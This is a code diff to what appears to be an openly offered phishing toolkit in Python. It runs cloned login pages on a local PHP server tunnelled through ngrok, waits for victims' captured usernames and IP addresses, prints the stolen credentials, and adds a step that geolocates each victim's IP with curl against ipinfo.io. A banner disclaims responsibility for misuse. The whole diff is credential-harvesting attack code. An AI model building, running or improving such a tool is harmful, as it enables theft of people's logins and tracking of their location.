@@ -31,7 +31,7 @@ print(Style.RESET_ALL + Style.BRIGHT + Fore.LIGHTBLACK_EX + """
   Disclaimer: We are not responsible for any misuse of this tool
 		     Telegram group: @offlicalClow3nSec""")
 if os.path.exists("ngrok"):
-    print("\n[*]ngrok founded")
+    print("\n[*]ngrok found")
 else:
     os.system("chmod +x ngrok_download.sh")
     os.system("bash ngrok_download.sh")
@@ -78,8 +78,12 @@ elif(select == 99):
 
 if os.path.exists("sites/%s/usernames.txt" % server):
     os.system("rm sites/%s/usernames.txt &" % server)
+else:
+    None
 if os.path.exists("sites/%s/ip.txt" % server):
     os.system("rm sites/%s/ip.txt &" % server)
+else:
+    None
 
 print("[*]Starting php Server")
 os_command = ("cd sites/%s && php -S 127.0.0.1:3333 > /dev/null 2>&1 & " % server)
@@ -117,11 +121,19 @@ i = 0
 while(i != 1):
     if os.path.exists("sites/%s/ip.txt" % server):
         os.system("cat sites/%s/ip.txt" % server)
-        os.system("rm sites/%s/ip.txt" % server)
         i = i+1
 print("\n[*]Waiting for credentials\n")        
 while True:
     if os.path.exists("sites/%s/usernames.txt" % server):
         username =("cat sites/%s/usernames.txt" % server)
         os.system(username)
+        fil = open('sites/%s/ip.txt' % server)
+        ipcred = fil.readline()
+        mipcred = ipcred[4:]
+        print('\nIP Credentials" ')
+        cmd1 = "curl ipinfo.io/{0}".format(mipcred)
+        print(cmd1)
+        os.system(cmd1)
+        os.system("rm sites/%s/ip.txt" % server)
+        fil.close()
         break
